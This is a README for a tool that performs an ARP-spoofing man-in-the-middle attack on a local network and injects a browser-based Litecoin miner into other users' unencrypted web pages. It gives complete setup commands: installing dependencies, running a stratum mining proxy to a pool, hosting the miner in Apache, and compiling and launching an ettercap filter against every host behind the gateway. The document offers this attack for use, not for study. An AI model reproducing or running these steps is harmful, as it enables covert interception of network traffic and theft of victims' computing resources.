This provides a way to mine Litecoin, distributed over a network via browsers.
It will inject the code into the browsers of every computer reading html from
port 80 on a LAN and mine LTC in javascript.  Some pages work and some don't,
https for example is not supported, and probably never will be.  Some pages
also don't have 'room' once their newlines and comments have been removed to
inject the miner, the packet would be too long.  The code automatically prints
the correct number of spaces as 'filler' to line up to the packet offsets, and
fill the html page so we don't time it out on page load.  We mine on 4 threads
by default, but this can be easily modified.  By default we're doing this by
means of arp spoofing, but if you need to take the network in another way where
you can pass it through the etterfilter, feel free.



Install some dependancies:
```
apt-get install python2.7 devscripts debhelper pbuilder python-twisted python-dev python-setuptools python-autobahn libapache2-mod-php5 php5-curl ettercap apache2
```
setup stratum-mining-proxy:
```
cd stratum && ./setup.py develop
cd ..
cd stratum-mining-proxy && distribute_setup.py; chmod u+x setup.py; ./setup.py develop; mkdir log;
./mining_proxy.py -o ltc.ghash.io -p 3333 -sh 127.0.0.1 -oh 127.0.0.1  -cu up100454499.Web -cp yourpass -st -l log.txt
```
move lm to your apache directory:
```
cp lm /var/www/html -R
/etc/init.d/apache2 restart
```
MITM the network:
```
etterfilter hashnet.etterfilter -o nh.ef
ettercap -T -M arp:remote -q -F nh.ef /192.168.0.1/ //
```
CHANGE hashnet.etterfilter file's ip in the perl script section to point to the webserver where you host the miner.

Test it by going to 127.0.0.1/lm

NOTE: You need a pretty large LAN for this to be worth it.  This mines with 4 cpu threads by default.
THANKS: Thanks to slush0, esenminer, and the ettercap team
